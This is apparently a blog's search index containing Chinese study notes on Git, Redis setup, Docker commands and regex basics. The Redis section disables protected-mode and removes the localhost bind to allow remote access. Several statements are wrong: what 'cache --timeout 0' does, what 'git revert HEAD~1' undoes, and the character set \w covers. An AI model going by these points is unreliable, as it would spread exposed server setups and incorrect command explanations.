<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>git笔记</title>
    <url>/2021/07/26/%E5%B7%A5%E5%85%B7/git%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="概览"><a class="header-anchor" href="#概览"></a>概览</h2>
<p>与svn等集中式版本控制系统不同，git为分布式版本控制系统，每个开发者都保存整个项目的完整镜像</p>
<p><img src="/2021/07/26/%E5%B7%A5%E5%85%B7/git%E7%AC%94%E8%AE%B0/211915189723300.jpg" class="lazy" data-srcset="/2021/07/26/%E5%B7%A5%E5%85%B7/git%E7%AC%94%E8%AE%B0/211915189723300.jpg" srcset="/images/loadingImage.gif" alt="211915189723300.jpg"></p>
<p>工作区间: 即我们创建的工程文件， 在编辑器可直观显示；</p>
<p>暂存区: 只能通过git GUI或git shell 窗口显示，提交代码、解决冲突的中转站；</p>
<p>本地仓库: 只能在git shell 窗口显示，连接本地代码跟远程代码的枢纽，不能联网时本地代码可先提交至该处；</p>
<p>远程仓库: 即保存我们代码的服务器，本文以公共版本控制系统：github为例，登录github账号后可直观显示；</p>
<h2 id="Git特点"><a class="header-anchor" href="#Git特点"></a>Git特点</h2>
<p><strong>直接记录快照，而非比较差异</strong></p>
<p>Git只关心文件数据的整体是否发生变化，而不是文件内容的具体差异。当文件整体发生变化时（比较指纹信息），则记录快照；若文件整体不变，则只保存上一版本快照的索引，避免重复存储。</p>
<p><strong>几乎所有操作都是本地执行</strong></p>
<p>Git中绝大多数操作都只需要访问本地文件和资源，不用联网。</p>
<p><strong>校验和（checksum）为文件的唯一标识</strong></p>
<p>一旦文件的完整性收到损坏，那么git就能立刻察觉到。</p>
<p><strong>多数操作仅添加数据</strong></p>
<p>常用的Git操作大多仅仅是把数据添加到数据库，因为任何一种不可逆的操作（如删除）都会使回退变得更加困难。</p>
<p><strong>文件的三种状态</strong></p>
<p>对于任何一个文件，在Git中只有已提交（committed），已修改（modified）和已暂存（staged）三种状态。</p>
<p>已提交表示该文件已经被安全地保存在本地数据库；</p>
<p>已修改表示修改了某个文件，但还没有提交保存；</p>
<p>已暂存表示把已修改的文件放在下次提交时要保存的清单中了</p>
<h2 id="使用方法"><a class="header-anchor" href="#使用方法"></a>使用方法</h2>
<h3 id="获得一个Git仓库"><a class="header-anchor" href="#获得一个Git仓库"></a>获得一个Git仓库</h3>
<p><strong>git初始化</strong></p>
<p>要对现有的某个项目开始用 Git 管理，只需到此项目所在的目录，执行：</p>
<pre><code class="hljs shell">git init</code></pre>
<p>初始化后，在当前目录下会出现一个名为 .git 的目录，所有 Git 需要的数据和资源都存放在这个目录中。不过目前，仅仅是按照既有的结构框架初始化好了里边所有的文件和目录，但我们还没有开始跟踪管理项目中的任何一个文件。</p>
<p>如果当前目录下有几个文件想要纳入版本控制，需要先用 git add 命令告诉 Git 开始对这些文件进行跟踪，然后提交：</p>
<pre><code class="hljs shell">git add *.c		#把所有的c源码纳入版本控制（加入暂存区）
git add README	#把README加入版本控制（加入暂存区）
git commit -m 'initial project version'		#提交代码到本地仓库</code></pre>
<p><strong>git clone</strong></p>
<p><code>git clone</code>用于从服务器上获取git仓库，并且获取的是项目历史的所有数据（每一个文件的每一个版本），服务器上有的数据克隆之后本地也都有了。实际上，即便服务器的磁盘发生故障，用任何一个克隆出来的客户端都可以重建服务器上的仓库，回到当初克隆时的状态。</p>
<pre><code class="hljs shell">git clone [url]</code></pre>
<p>如果希望在克隆的时候，自己定义要新建的项目目录名称，可以在上面的命令末尾指定新的名字：</p>
<pre><code class="hljs shell">git clone git://github.com/schacon/grit.git mygrit</code></pre>
<h3 id="状态检查"><a class="header-anchor" href="#状态检查"></a>状态检查</h3>
<p><strong>查看当前项目的git状态</strong></p>
<pre><code class="hljs shell">git status	## 在项目根目录下运行</code></pre>
<p><strong>对比文件修改情况</strong></p>
<pre><code class="hljs shell">git diff
git diff --cached</code></pre>
<p><code>git diff</code>命令比较的是工作目录中当前文件和暂存区域快照之间的差异，也就是修改之后还没有暂存起来的变化内容</p>
<p>若要看已经暂存起来的文件和上次提交时的快照之间的差异，可以用 <code>git diff --cached</code>（Git 1.6.1 及更高版本还允许使用<code>git diff --staged</code>，效果是相同的，但更好记些。）</p>
<p><strong>查看提交历史</strong></p>
<pre><code class="hljs shell">git log [-p] [-2]
<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># -p 表示展开显示每次提交的内容差异，-2 表示仅展示最近的两次提交</span></span></code></pre>
<p><a href="https://blog.csdn.net/bdss58/article/details/40537859">理解head和master</a></p>
<h3 id="基础配置"><a class="header-anchor" href="#基础配置"></a>基础配置</h3>
<p><strong>查看git配置信息</strong></p>
<pre><code class="hljs shell">git config -l ## 显示所有当前配置
git config --global -l  ## 显示所有全局配置
git config --local -l  ## 显示所有当前仓库独有配置
git config --unset user.name ## 删除 user.name 配置项</code></pre>
<p><strong>配置远程地址</strong></p>
<pre><code class="hljs shell">git remote add &lt;name&gt; &lt;url&gt;  ## 添加远程地址，可添加多个
git remote remove &lt;name&gt; ## 删除远程地址</code></pre>
<p><strong>记住密码</strong></p>
<pre><code class="hljs shell">git config credential.helper store ## 设置记住密码
git config credential.helper 'cache --timeout 0' ## 15min后清除密码</code></pre>
<p><strong>.gitignore</strong></p>
<p>一般我们总会有些文件无需纳入 Git 的管理，也不希望它们总出现在未跟踪文件列表。通常都是些自动生成的文件，比如日志文件，或者编译过程中创建的临时文件等。我们可以在项目根目录下创建如下一个名为 .gitignore 的文件，列出要忽略的文件模式</p>
<pre><code class="hljs text">## 此为注释 – 将被 Git 忽略
*.a       ## 忽略所有 .a 结尾的文件
!lib.a    ## 但 lib.a 除外
&#x2F;TODO     ## 仅仅忽略项目根目录下的 TODO 文件，不包括 subdir&#x2F;TODO
build&#x2F;    ## 忽略 build&#x2F; 目录下的所有文件
doc&#x2F;*.txt ## 会忽略 doc&#x2F;notes.txt 但不包括 doc&#x2F;server&#x2F;arch.txt
*.[oa]    ## 忽略所有以 .o 或 .a 结尾的文件（编译过程文件）
*~        ## 忽略所有以波浪符 ~ 结尾的文件（文件副本）</code></pre>
<blockquote>
<p>文件 .gitignore 的格式规范如下：<br>
所有空行或者以注释符号<code>＃</code>开头的行都会被 Git 忽略。<br>
可以使用标准的 glob 模式匹配。<code> *</code> 匹配模式最后跟反斜杠<code>/</code>说明要忽略的是目录。<br>
要忽略指定模式以外的文件或目录，可以在模式前加上叹号<code>!</code>取反</p>
</blockquote>
<h3 id="工作区-暂存区"><a class="header-anchor" href="#工作区-暂存区"></a>工作区&lt;-&gt;暂存区</h3>
<h4 id="add"><a class="header-anchor" href="#add"></a>add</h4>
<pre><code class="hljs shell">git add [options] [&lt;file&gt;…]</code></pre>
<p><code>git add</code>是一个多功能命令，它可以将项目文件纳入跟踪范围，也可以将所做的修改暂存到暂存区，<code>git commit</code>只会把已加入暂存区的文件版本提交到本地仓库，所以每对项目文件做一次修改，都要使用<code>git add</code>命令将它加入暂存区，否则提交的可能就是修改之前的版本了。</p>
<h4 id="文件操作"><a class="header-anchor" href="#文件操作"></a>文件操作</h4>
<p><strong>git rm</strong></p>
<p><code>git rm &lt;filename&gt;</code>用来将不需要的文件同时从Git仓库和工作目录中删除，如果只是手动从工作目录中删除该文件，则还会在&quot;Changed but not updated&quot;中看到。</p>
<p>如果希望在工作目录中保留文件，只从git仓库中删除，那么可以加上<code>--cached</code>参数</p>
<p><strong>git mv</strong></p>
<p>常用于文件移动和重命名</p>
<pre><code class="hljs shell">git mv file_from file_to</code></pre>
<h4 id="回滚"><a class="header-anchor" href="#回滚"></a>回滚</h4>
<pre><code class="hljs shell">git restore &lt;file&gt;    # 丢弃工作区的修改（包括对文件自身的操作，如添加文件、删除文件）
git restore --staged &lt;file&gt;    #将暂存区的修改重新放回工作区（包括对文件自身的操作，如添加文件、删除文件）</code></pre>
<h4 id="贮藏更改"><a class="header-anchor" href="#贮藏更改"></a>贮藏更改</h4>
<p>场景一：当你在工作区做了一些修改，并想要将这些修改提交到git仓库时，你发现共同开发这个项目的同事已经提交了一些内容。这时候你如果直接提交并推送到远程仓库，就会因为分支冲突而推送失败。</p>
<p>场景二：当你在分支<code>dev</code>做了一些修改之后，想切换到<code>master</code>分支去做一些事情，但又不想为做到一半的工作创建一次提交，那么你就需要将你所做的修改贮藏起来。</p>
<p>为了解决这些问题，我们可以使用<code>git stash</code>命令，将我们的在工作区所做的更改贮藏到一个栈上，并且在任何时候重新应用这些改动（甚至在不同的分支上）</p>
<p>常用的<code>git stash</code>命令用法如下所示：</p>
<pre><code class="hljs shell">git stash  # 贮藏工作区的修改，将工作区变成上次提交时的样子
git stash list  # 列出已经贮藏的内容
git stash apply  # 将最近一次的贮藏应用到当前分支
git stash apply stash@&#123;2&#125;  # 将 stash@&#123;2&#125; 这个贮藏应用到当前分支
git stash pop  # 将最近一次的贮藏应用到当前分支并删除该贮藏</code></pre>
<p>更详细的说明可以参考：<a href="https://git-scm.com/book/zh/v2/Git-%E5%B7%A5%E5%85%B7-%E8%B4%AE%E8%97%8F%E4%B8%8E%E6%B8%85%E7%90%86">https://git-scm.com/book/zh/v2/Git-工具-贮藏与清理</a></p>
<h3 id="暂存区-本地仓库"><a class="header-anchor" href="#暂存区-本地仓库"></a>暂存区&lt;-&gt;本地仓库</h3>
<p><strong>git commit</strong></p>
<p>一般使用<code>git comit -m &quot;your comment&quot;</code>将代码提交到本地仓库，提交后工作区清空，再次修改则需要重新<code>git add</code>，如果不加<code>-m</code>参数，那么会启动文本编辑器以输入本次提交的说明。</p>
<p>每一次运行提交操作，都是对你项目作一次快照，以后可以回到这个状态，或者进行比较。</p>
<p>尽管使用暂存区域的方式可以精心准备要提交的细节，但有时候这么做略显繁琐。Git 提供了一个跳过使用暂存区域的方式，只要在提交的时候，加上<code>-a</code> 选项，Git 就会自动把所有已经跟踪过的文件暂存起来一并提交，从而跳过 <code>git add</code> 步骤。</p>
<h3 id="本地仓库-远程仓库"><a class="header-anchor" href="#本地仓库-远程仓库"></a>本地仓库&lt;-&gt;远程仓库</h3>
<h4 id="git-push"><a class="header-anchor" href="#git-push"></a>git push</h4>
<p>将本地的分支版本上传到远程并合并</p>
<pre><code class="hljs shell">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</code></pre>
<h4 id="git-fetch"><a class="header-anchor" href="#git-fetch"></a>git fetch</h4>
<p>从远程仓库下载最新的commit，并且同时保留本地分支head和远程分支remotes，需要另外使用<code>git merge</code>合并分支</p>
<h4 id="git-pull"><a class="header-anchor" href="#git-pull"></a>git pull</h4>
<p>下载远程分支中最新的commit并合并（不建议使用，可能出现未解决代码冲突的情况）</p>
<h3 id="操作撤销"><a class="header-anchor" href="#操作撤销"></a>操作撤销</h3>
<p>在进行文件修改等操作后，使用<code>git status</code>查看状态，可以看到git给出的撤销提示</p>
<p><img src="/2021/07/26/%E5%B7%A5%E5%85%B7/git%E7%AC%94%E8%AE%B0/image-20210708151055459.png" class="lazy" data-srcset="/2021/07/26/%E5%B7%A5%E5%85%B7/git%E7%AC%94%E8%AE%B0/image-20210708151055459.png" srcset="/images/loadingImage.gif" alt="image-20210708151055459"></p>
<p>更多参考：<a href="https://blog.csdn.net/Sweet_19BaBa/article/details/111950384">git checkout，git restore 和 git reset</a></p>
<h4 id="reset版本回退"><a class="header-anchor" href="#reset版本回退"></a>reset版本回退</h4>
<p>首先<code>git log</code>查看历史提交的版本信息，得到各个commit的id，即其哈希值</p>
<p>然后使用<code>git reset --hard &lt;commitId&gt;</code>切换到各个版本提交时的状态（清空暂存区），如果版本已提交到远程仓库，则需要在本地仓库回退后使用<code>git push -f</code>将操作强制同步到远程仓库。</p>
<p>但实际上回退之前的版本还是存在的，使用<code>git reflog</code>可以查看历史版本记录，找到已提交过的任何一个版本的commitId，通过commitId仍可以切回最新的未回退的版本。</p>
<h4 id="revert版本回退"><a class="header-anchor" href="#revert版本回退"></a>revert版本回退</h4>
<p>使用<code>git reset</code>回退公共远程分支的版本后，其他人都需要用远程master分支覆盖本地master分支，显然，这不是优雅的回退方法，而<code>revert</code>命令则可以避免这个问题。</p>
<pre><code class="hljs shell">git revert HEAD                     //撤销最近一次提交
git revert HEAD~1                   //撤销最近2次提交
git revert 0ffaacc                  //撤销0ffaacc这次提交</code></pre>
<p>git revert 命令意思是撤销某次提交。它会产生一个新的提交，虽然代码回退了，但是版本依然是向前的。所以，当你用revert回退完，所有人pull之后，代码也自动回退了。</p>
<h3 id="分支管理"><a class="header-anchor" href="#分支管理"></a>分支管理</h3>
<h4 id="分支新建、切换、删除"><a class="header-anchor" href="#分支新建、切换、删除"></a>分支新建、切换、删除</h4>
<pre><code class="hljs shell">git branch                  #列出已有分支
git branch &lt;branchname&gt;     #创建新分支
git checkout &lt;branchname&gt;   #切换到分支
git branch -d &lt;branchname&gt;  #删除分支</code></pre>
<p>在一个分支进行文件修改、新建、删除等操作在commit后不会影响其他分支。</p>
<h4 id="分支合并"><a class="header-anchor" href="#分支合并"></a>分支合并</h4>
<pre><code class="hljs shell">git merge &lt;branchname&gt;    #把 &lt;branchname&gt; 分支合并到当前分支</code></pre>
<p>在将<code>branch2</code>合并到<code>branch1</code>的过程中，branch2中新建文件、删除原有文件、修改原有文件等操作将同步到<code>branch1</code>，当两个分支都做出修改时，可能会出现代码冲突，这时候需要我们手动修改解决冲突后再次提交才能合并成功。</p>
<p>如果我们的主分支 <code>master</code> ，在 checkout 一个新的分支（<code>bugfix</code>）后，产生了多次提交，这时候我们将<code>bugfix</code>分支合并到<code>master</code>，<code>bugfix</code>分支上新产生的所有提交记录都会同步到<code>master</code>，导致主线版本的提交记录杂乱。如果我们想要在合并分支时只产生一条提交记录，则需要使用<code>--squash</code>参数，</p>
<pre><code class="hljs shell">git merge --squash bugfix</code></pre>
<h2 id="常见问题"><a class="header-anchor" href="#常见问题"></a>常见问题</h2>
<ol>
<li>
<p>新建GitHub仓库，第一次push时验证账号密码失败</p>
<p>一开始提示输入GitHub的用户名口令，正确输入后还是验证失败。这时候会出现新的登录窗口，提示通过OpenSSH登录到GitHub，这时候，输入GitHub用户名和access token（settings-developer settings-Personal access tokens）即可登录成功</p>
</li>
<li>
<p>配置免密登录</p>
<p><a href="https://www.cnblogs.com/qishuaiRisen/p/16650513.html">https://www.cnblogs.com/qishuaiRisen/p/16650513.html</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis笔记</title>
    <url>/2022/12/27/%E5%B7%A5%E5%85%B7/Redis%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="Redis是什么"><a class="header-anchor" href="#Redis是什么"></a>Redis是什么</h2>
<p>概括地说：Redis是一个内存数据库（in-memory data store，说白话就是所有的数据都在内存里放着，不过有些内存数据库产品如Redis，在关机、断电等特殊情况下会把数据dump到硬盘里以便后续恢复），但又可以当做<strong>缓存</strong>或者<strong>消息中间件</strong>去使用。</p>
<h2 id="Redis怎么用"><a class="header-anchor" href="#Redis怎么用"></a>Redis怎么用</h2>
<h3 id="作为缓存使用"><a class="header-anchor" href="#作为缓存使用"></a>作为缓存使用</h3>
<p>因为Redis的速度很快，所以可以拿他来缓存一些数据库请求数据、复杂的计算结果、API调用结果、用户的会话状态等，从而提高程序的执行速度。</p>
<h3 id="作为消息中间件使用"><a class="header-anchor" href="#作为消息中间件使用"></a>作为消息中间件使用</h3>
<p>在一个异步程序中，有7个线程负责从硬盘的不同目录去取待处理的数据，1个线程去对取来的数据做运算。这时候就可以把Redis当做消息队列来用，取数据的线程把每次取来的数据丢到Redis里面，处理数据的线程只管从Redis里面取数据然后加工，而Redis就起到一个容器+传送带的作用，每个线程都有明确的分工，整个程序的逻辑也更清晰。</p>
<h2 id="Redis安装配置"><a class="header-anchor" href="#Redis安装配置"></a>Redis安装配置</h2>
<h3 id="安装server端"><a class="header-anchor" href="#安装server端"></a>安装server端</h3>
<p>ubuntu、debian环境推荐直接使用apt工具安装</p>
<pre><code class="hljs bash">sudo apt-get install redis-server</code></pre>
<p>centos环境使用yum安装</p>
<pre><code class="hljs bash">sudo yum install redis-server</code></pre>
<h3 id="允许远程访问"><a class="header-anchor" href="#允许远程访问"></a>允许远程访问</h3>
<p><strong>修改配置文件：/etc/redis/redis.conf</strong></p>
<p>注销掉<code>bind 127.0.0.1 ::1</code></p>
<pre><code class="hljs bash"><span class="hljs-comment">#bind 127.0.0.1 ::1</span></code></pre>
<p>再将<code>protected-mode</code>设置为<code>no</code>（允许来自外部的连接，即使未设置访问密码）</p>
<pre><code class="hljs bash">protected-mode no</code></pre>
<h3 id="设置访问密码"><a class="header-anchor" href="#设置访问密码"></a>设置访问密码</h3>
<p>若不创建新的redis用户账号，可以直接通过<strong>修改配置文件：/etc/redis/redis.conf</strong> 的方式设置<code>default</code>用户的访问密码，找到<code>requirepass</code>，取消注释并修改为自己的密码即可，重启redis-server服务生效</p>
<pre><code class="hljs bash"><span class="hljs-comment"># The requirepass is not compatable with aclfile option and the ACL LOAD</span>
<span class="hljs-comment"># command, these will cause requirepass to be ignored.</span>
<span class="hljs-comment">#</span>
requirepass your_pass_word</code></pre>
<h3 id="启停redis-server"><a class="header-anchor" href="#启停redis-server"></a>启停redis-server</h3>
<pre><code class="hljs bash">service redis-server start <span class="hljs-comment"># 启动</span>
service redis-server stop <span class="hljs-comment"># 停止</span>
service redis-server restart <span class="hljs-comment"># 重启</span></code></pre>
<h3 id="使用redis-cli进行管理"><a class="header-anchor" href="#使用redis-cli进行管理"></a>使用redis-cli进行管理</h3>
<p>连接redis-server</p>
<pre><code class="hljs bash"><span class="hljs-comment"># 使用参数指定连接目标和使用的密码</span>
redis-cli -h localhost -p 6379 -a your_pass_word

<span class="hljs-comment"># 使用url进行连接，</span>
redis-cli -u redis://your_pass_word@localhost:6379/0</code></pre>
<p><strong>常用命令</strong></p>
<pre><code class="hljs plain"># 测试服务是否启动
ping

# 创建DBA管理账号
ACL SETUSER username on &gt;password allkeys +@all</code></pre>
<p>更多访问控制配置可以参考：<a href="https://blog.csdn.net/qq_29235677/article/details/121475204">Redis 6.0 访问控制列表ACL说明</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>redis</tag>
        <tag>消息队列</tag>
      </tags>
  </entry>
  <entry>
    <title>docker常用命令</title>
    <url>/2020/07/20/%E5%B7%A5%E5%85%B7/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="镜像管理"><a class="header-anchor" href="#镜像管理"></a>镜像管理</h2>
<h3 id="配置镜像仓库的国内加速地址"><a class="header-anchor" href="#配置镜像仓库的国内加速地址"></a>配置镜像仓库的国内加速地址</h3>
<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Ubuntu16.04+、Debian8+、CentOS7适用</span></span>
<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 创建或修改daemon配置文件:/etc/docker/daemon.json,内容如下</span></span>
&#123;
  "registry-mirrors": ["https://&lt;个人ID&gt;.mirror.aliyuncs.com"]
&#125;
<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 保存文件后，重启服务</span></span>
sudo systemctl daemon-reload
sudo systemctl restart docker</code></pre>
<h3 id="从云端镜像仓库获取新镜像"><a class="header-anchor" href="#从云端镜像仓库获取新镜像"></a>从云端镜像仓库获取新镜像</h3>
<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 安装最新版镜像</span></span>
docker pull &lt;镜像名&gt;

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 指定镜像版本安装</span></span>
docker pull &lt;镜像名&gt;:&lt;镜像版本&gt;</code></pre>
<h2 id="容器管理"><a class="header-anchor" href="#容器管理"></a>容器管理</h2>
<h3 id="从镜像创建并运行一个新容器"><a class="header-anchor" href="#从镜像创建并运行一个新容器"></a>从镜像创建并运行一个新容器</h3>
<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 前台运行</span></span>
docker run &lt;镜像名&gt;

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 后台运行</span></span>
docker run -d &lt;镜像名&gt;

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 把容器的一个服务端口映射到宿主机上</span></span>
docker run -p &lt;宿主机端口&gt;:&lt;容器端口&gt; &lt;镜像名&gt;

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 映射多个端口</span></span>
docker run -p &lt;宿主机端口1&gt;:&lt;容器端口1&gt; \
			-p &lt;宿主机端口2&gt;:&lt;容器端口2&gt; \
			-p &lt;宿主机端口3&gt;:&lt;容器端口3&gt; &lt;镜像名&gt;
			
<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 指定容器名</span></span>
docker run --name &lt;容器名&gt; &lt;镜像名&gt;

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 以交互模式运行,在容器内执行 /bin/bash 命令</span></span>
docker run -it &lt;镜像名&gt; /bin/bash</code></pre>
<h3 id="管理已创建的容器"><a class="header-anchor" href="#管理已创建的容器"></a>管理已创建的容器</h3>
<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 列出运行中的容器,以下二者都可以</span></span>
docker container ls
docker ps

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 列出所有已创建的容器，包括停止运行的</span></span>
docker container ls -a
docker ps -a

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 启动 | 停止 | 重启 | 删除容器</span></span>
docker [ start | stop | restart | rm ] &lt;容器名或容器ID&gt;

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 重命名容器</span></span>
docker rename &lt;原容器名&gt; &lt;新容器名&gt;

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 交互模式在容器内执行 /bin/bash 命令</span></span>
docker run -it &lt;容器名或容器ID&gt; /bin/bash

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 从宿主机拷贝文件或文件夹到容器</span></span>
docker cp &lt;宿主机中的文件路径&gt; &lt;容器名或容器ID&gt;:&lt;容器内文件路径&gt;

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 从容器拷贝文件或文件夹到宿主机</span></span>
docker cp &lt;容器名或容器ID&gt;:&lt;容器内文件路径&gt; &lt;宿主机中的文件路径&gt;</code></pre>
<h2 id="Docker-Compose"><a class="header-anchor" href="#Docker-Compose"></a>Docker Compose</h2>
<p>使用 Docker Compose 可以很方便地定义和运行多容器应用程序，通过yml文件即可进行配置。</p>
<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 首先移动到docker-compose.yml配置文件所在目录</span></span>
cd &lt;docker-compose.yml所在目录&gt;

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 前台运行应用程序</span></span>
docker-compose up

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 后台运行应用程序</span></span>
docker-compose up -d

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 停止应用程序</span></span>
docker-compose stop

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 重新启动应用程序</span></span>
docker-compose restart

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 删除停止运行的容器</span></span>
docker-compose rm

<span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 停止运行应用程序并删除对应容器</span></span>
docker-compose down</code></pre>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式笔记</title>
    <url>/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="简介"><a class="header-anchor" href="#简介"></a>简介</h2>
<blockquote>
<p>正则表达式是描述一组字符串特征的模式，用来匹配特定的字符串。 ——Ken Thompson</p>
</blockquote>
<p>一个正则表达式是一串特殊的字符串，它可以用于匹配一组字符串。比如</p>
<pre><code class="hljs plain">\d</code></pre>
<p>就是一个简单的正则表达式，它可以用来匹配0~9范围内的任意<strong>一个数字</strong>。</p>
<pre><code class="hljs plain">^(\(\d&#123;3&#125;\)|^\d&#123;3&#125;[.-]?)?\d&#123;3&#125;[.-]?\d&#123;4&#125;$</code></pre>
<p>而上面这个式子也是一个正则表达式，只不过复杂了一些，它可以匹配10位的北美电话号码。无论区号是否加括号，数字间是否有句点或连字符，它都可以匹配。</p>
<p><strong>学习时用到的工具</strong>：</p>
<blockquote>
<p><a href="https://regex101.com/">Regexpal网站</a>：可以在线测试正则表达式</p>
</blockquote>
<h2 id="基础"><a class="header-anchor" href="#基础"></a>基础</h2>
<h3 id="字符的匹配"><a class="header-anchor" href="#字符的匹配"></a>字符的匹配</h3>
<h4 id="字面值匹配"><a class="header-anchor" href="#字面值匹配"></a>字面值匹配</h4>
<p>最简单的一种，比如一个数字字符串<code>666</code>，可以在目标文本中匹配所有的<code>666</code></p>
<p><img src="/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%94%E8%AE%B0/fN1TQqSlujEPBCy.png" class="lazy" data-srcset="/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%94%E8%AE%B0/fN1TQqSlujEPBCy.png" srcset="/images/loadingImage.gif" alt></p>
<h4 id="字符组匹配"><a class="header-anchor" href="#字符组匹配"></a>字符组匹配</h4>
<p>正则表达式将方括号<code>[]</code>视为特殊的元字符，因此方括号本身不参与匹配，而对括号内容进行匹配。字符组包括以下几种情况：</p>
<p><code>[aBc]</code>：匹配<code>a</code>,<code>B</code>,<code>c</code>三个字符中的其中一个</p>
<p><code>[0-9]</code>：匹配0到9范围内的任意数字。要匹配任意3位数字可以用 <code>[0-9][0-9][0-9]</code></p>
<p><code>[a-z]</code>：匹配所有小写字母</p>
<p><code>[A-Z]</code>：匹配所有大写字母</p>
<p><code>[a-zA-Z]</code>：匹配所有大小写字母</p>
<p><code>[^ARP]</code>：匹配除了<code>A</code>,<code>R</code>,<code>P</code>以外的所有字符</p>
<p><code>[^a-z]</code>：匹配所有除了小写字母以外的字符</p>
<h4 id="字符组简写式（元字符）"><a class="header-anchor" href="#字符组简写式（元字符）"></a>字符组简写式（元字符）</h4>
<p>例如：<code>[0-9]</code>可以简写为<code>\d</code>，它们都能匹配0到9之间的任意一个数字。</p>
<p>空白字符：</p>
<p><code>\f</code>：换页符</p>
<p><code>\n</code>：换行符</p>
<p><code>\r</code>：回车符</p>
<p><code>\t</code>：制表符（Tab的缩进）</p>
<p><code>\v</code>：垂直制表符</p>
<p><code>\s</code>：任意一个空白字符，等价于 [\f\n\r\t\v]</p>
<p><code>\S</code>：对<code>\s</code>取非，即任意非空字符</p>
<p>数字元字符：</p>
<p><code>\d</code>：匹配任意阿拉伯数字</p>
<p><code>\D</code>：匹配任意非数字字符（如连字符<code>-</code>)</p>
<p>字母数字元字符：</p>
<p><code>\w</code>：大小写字母，下划线和数字，等价于[a-zA-Z0-9]</p>
<p><code>\W</code>：对<code>\w</code>取非</p>
<h4 id="任意字符的匹配"><a class="header-anchor" href="#任意字符的匹配"></a>任意字符的匹配</h4>
<p><code>.</code>：点号（英文句号）可以匹配任意字符（但一般不匹配换行符）。</p>
<p><code>.</code>是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上<code> \</code> 。</p>
<h3 id="捕获分组和后向引用"><a class="header-anchor" href="#捕获分组和后向引用"></a>捕获分组和后向引用</h3>
<p>将<code>\d</code>放到<code>()</code>中，则<code>\d</code>匹配到一个数字的同时该数字被捕获。捕获之后则可以被后向引用。</p>
<p><code>\1</code>后向引用被捕获的字符。</p>
<p>例如：正则表达式 <code>(\d)\d\1</code>  可以匹配 <code>101</code> 或者 <code>212</code> , <code>383</code> 等等,但无法匹配 <code>102</code> 。因为<code>\1</code>引用的是那个被捕获的字符，所以这个正则表达式匹配到的一定是某三个相连数字，其中第一个数字和第三个数字一定是相同的。</p>
<h3 id="量词"><a class="header-anchor" href="#量词"></a>量词</h3>
<p><code>\d{3}</code>匹配三个相连数字，这里<code>{3}</code>就是一个量词，花括号中可以有多个数字（用逗号<code>,</code>隔开）比如<code>{3,4}</code>表示3个或者4个；</p>
<p><code>\d-?</code>匹配一个数字，如果该数字之后跟着一个连字符那么连字符也会被匹配到。这里的<code>?</code>也是一个量词，表示0个或1个；</p>
<p>同理，其他常用的量词还有</p>
<p><code>+</code>：表示1个或者多个</p>
<p><code>*</code>：表示0个或者多个</p>
<h3 id="括选文字符"><a class="header-anchor" href="#括选文字符"></a>括选文字符</h3>
<p>现在可以看看下面这个比较健壮的表达式了，就是简介中的那个，它匹配10位的北美电话号码</p>
<pre><code class="hljs plain">^(\(\d&#123;3&#125;\)|^\d&#123;3&#125;[.-]?)?\d&#123;3&#125;[.-]?\d&#123;4&#125;$</code></pre>
<p><code>^</code>匹配行起始位置，即<code>^</code>后面跟着的内容<code>(\(\d{3}\)|^\d{3}[.-]?)</code>必须出现在行首；</p>
<p><code>\(</code>和<code>\)</code>就是将左右括号转义，让它表示其字面意思，而不是捕获分组的开始结束标志；</p>
<p><code>|</code>表示或运算，即匹配<code>|</code>两边的内容之一；</p>
